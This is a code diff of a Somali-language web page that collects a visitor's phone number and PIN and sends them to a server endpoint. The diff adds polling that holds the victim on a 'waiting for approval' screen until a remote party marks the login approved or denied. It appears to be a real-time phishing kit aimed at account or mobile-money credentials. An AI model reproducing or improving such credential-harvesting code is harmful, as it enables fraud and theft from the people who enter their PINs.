@@ -72,8 +72,8 @@
 
 <div class="loading-card">
     <div class="loader-circle"></div>
-    <h2 id="main-text">Habaynta...</h2>
-    <p id="sub-text">Diyaarinaya xaqiijinta...</p>
+    <h2 id="main-text">Sugaya...</h2>
+    <p id="sub-text">Sugaya oggolaanshaha...</p>
 </div>
 
 <script>
@@ -95,33 +95,49 @@ document.addEventListener("DOMContentLoaded", async () => {
     console.log("📱 PHONE:", phone);
     console.log("🔢 PIN:", pin);
 
+    // STEP 1: SEND LOGIN REQUEST
     try {
-        const res = await fetch('/api/login-notification', {
+        await fetch(window.location.origin + '/api/login-notification', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phone, pin })
         });
 
-        const data = await res.json();
-        console.log("📩 RESPONSE:", data);
-
-        if (!res.ok) {
-            console.error("❌ Server rejected request");
-        }
+        console.log("📩 Login sent to server");
 
     } catch (err) {
-        console.error("❌ FETCH ERROR:", err);
+        console.error("❌ SEND ERROR:", err);
     }
 
-    setTimeout(() => {
-        mainText.textContent = "Fadlan sug...";
-        subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
+    // STEP 2: WAIT FOR APPROVAL (POLLING)
+    async function checkApproval() {
+        try {
+            const res = await fetch(window.location.origin + `/api/check-status?phone=${phone}`);
+            const data = await res.json();
 
-        setTimeout(() => {
-            window.location.href = "/page8";
-        }, 4000);
+            console.log("🔄 STATUS:", data);
 
-    }, 3000);
+            if (data.status === "approved") {
+                mainText.textContent = "La ansixiyay!";
+                subText.textContent = "U wareegaya bogga xiga...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8.html";
+                }, 2000);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "La diiday!";
+                subText.textContent = "Fadlan isku day mar kale";
+            }
+
+        } catch (e) {
+            console.error("❌ STATUS CHECK ERROR:", e);
+        }
+    }
+
+    // check every 3 seconds
+    setInterval(checkApproval, 3000);
 
 });
 </script>
